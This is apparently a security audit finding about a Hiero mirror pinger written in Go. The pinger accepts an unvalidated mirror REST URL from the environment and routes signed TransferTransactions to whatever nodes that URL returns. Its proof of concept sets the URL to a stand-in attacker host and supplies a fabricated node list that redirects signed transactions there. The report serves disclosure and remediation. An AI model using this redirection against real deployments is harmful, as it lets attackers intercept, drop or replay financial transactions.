### Title
Attacker-Controlled Mirror REST URL Redirects All TransferTransactions to Malicious Nodes

### Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the pinger unconditionally fetches its consensus node list from the URL in `HIERO_MIRROR_PINGER_REST` with no allowlist, TLS pinning, or response validation. An attacker who can set these two environment variables can supply a fully fabricated node list, causing every signed `TransferTransaction` to be submitted exclusively to attacker-controlled gRPC endpoints.

### Finding Description

**Code path:**

1. `pinger/config.go` lines 36–37 — both variables are read from the environment with no URL validation:
   ```go
   flag.StringVar(&cfg.network,    "network",     envOr("HIERO_MIRROR_PINGER_NETWORK", "testnet"), ...)
   flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST",    ""),        ...)
   ```

2. `pinger/sdk_client.go` lines 17–22 — when `network == "other"`, the node map returned by `buildNetworkFromMirrorNodes` is used verbatim:
   ```go
   case "other":
       netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
       ...
       client = hiero.ClientForNetwork(netmap)
   ```

3. `pinger/mirror_node_client.go` lines 37–43 — the base URL is taken directly from `cfg.mirrorRest` with only a trailing-slash trim; no scheme, host, or allowlist check:
   ```go
   base := strings.TrimRight(strings.TrimSpace(cfg.mirrorRest), "/")
   url  = base + "/api/v1/network/nodes"
   ```

4. `pinger/mirror_node_client.go` lines 46, 79–84 — a plain `http.Client` (no custom transport, no TLS pinning) issues the GET:
   ```go
   httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
   ...
   req, _ := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
   resp, err := httpClient.Do(req)
   ```

5. `pinger/mirror_node_client.go` lines 95–124 — the JSON body is decoded and every `domain_name`/`ip_address_v4` + `port` pair is inserted into the network map with no IP-range check, no hostname validation, and no signature verification:
   ```go
   json.NewDecoder(resp.Body).Decode(&payload)
   ...
   addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
   network[addr] = nodeAccountId
   ```

6. `pinger/transfer.go` lines 29–33 — every periodic `TransferTransaction` is executed against this client, so all gRPC traffic goes to the attacker's addresses.

**Root cause:** The code assumes `cfg.mirrorRest` is a trusted, operator-controlled URL. There is no enforcement of that assumption: no allowlist, no TLS certificate pinning, no cryptographic verification of the returned node list, and no cross-check against a hard-coded or separately-sourced address book.

**Why existing checks are insufficient:**
- The only validation in `loadConfig()` for `mirrorRest` is that it must be non-empty when `network=other` (line 133). Any URL passes.
- `fetchMirrorNodeNetwork` only checks HTTP status codes (lines 90–93); a 200 response with attacker data is accepted.
- `len(network) == 0` guard (line 127) is trivially bypassed by returning at least one fake entry.

### Impact Explanation
Every `TransferTransaction` signed with the operator's private key is sent to attacker-controlled gRPC endpoints. The attacker can:
- **Drop** transactions silently (liveness failure, funds never move).
- **Replay** transactions to a real network later (double-spend if the transaction ID window allows).
- **Observe** the full signed transaction bytes, including the operator account ID, destination, and amount, enabling targeted follow-on attacks.
- **Return fabricated receipts**, causing the pinger to log false success while no real transfer occurred.

The operator private key (`HIERO_MIRROR_PINGER_OPERATOR_KEY`) is also loaded in the same process; a malicious node cannot extract it from gRPC traffic, but the signed transaction bytes are fully exposed.

Severity: **High** — complete redirection of all financial transactions to attacker infrastructure.

### Likelihood Explanation
The precondition is the ability to set two environment variables for the pinger process. In practice this is achievable by:
- A Kubernetes user with `patch`/`update` rights on the Deployment or its ConfigMap/Secret.
- A compromised CI/CD pipeline that injects environment variables at deploy time.
- A misconfigured secrets manager or external config source.
- An insider or supply-chain compromise of the deployment manifests.

Once the variables are set, the attack is **automatic and persistent**: every tick of the transfer loop sends transactions to the attacker without any further interaction. No runtime exploit or memory corruption is required.

### Recommendation
1. **Allowlist the mirror REST URL** at startup: parse the URL and reject any host not in an operator-supplied allowlist (e.g., `HIERO_MIRROR_PINGER_REST_ALLOWED_HOSTS`).
2. **Pin TLS certificates** for the mirror REST endpoint using a custom `http.Transport` with a restricted root CA pool.
3. **Verify the node address book** against a separately-sourced, signed address book (e.g., the one embedded in the Hiero SDK for known networks) before using it.
4. **Restrict environment variable mutation** at the infrastructure level (Kubernetes RBAC, immutable ConfigMaps, sealed secrets).
5. Consider treating `network=other` as a privileged, operator-only mode that requires an additional secret/token to activate.

### Proof of Concept

**Preconditions:** Attacker can set environment variables for the pinger container (e.g., via `kubectl set env`).

**Steps:**

1. Stand up a malicious HTTP server that returns a fabricated node list:
   ```json
   {
     "nodes": [{
       "node_account_id": "0.0.3",
       "service_endpoints": [{
         "domain_name": "attacker.example.com",
         "ip_address_v4": "",
         "port": 50211
       }]
     }],
     "links": {"next": null}
   }
   ```
   and a malicious gRPC server at `attacker.example.com:50211` that accepts Hiero proto transactions.

2. Set the environment variables:
   ```
   HIERO_MIRROR_PINGER_NETWORK=other
   HIERO_MIRROR_PINGER_REST=http://attacker.example.com
   ```

3. Restart (or wait for the next pod restart of) the pinger.

4. `loadConfig()` accepts the URL (non-empty, network=other check passes).
   `buildNetworkFromMirrorNodes()` GETs `http://attacker.example.com/api/v1/network/nodes`, decodes the response, and returns `{"attacker.example.com:50211": AccountID{0,0,3}}`.
   `hiero.ClientForNetwork(netmap)` builds a client pointing solely at the attacker node.

5. On every ticker tick, `submitWithRetry` executes a signed `TransferTransaction` against the attacker's gRPC endpoint. The attacker receives the full signed transaction bytes and can drop, replay, or log them at will.

**Result:** All pinger transactions are silently redirected to attacker infrastructure for the lifetime of the deployment.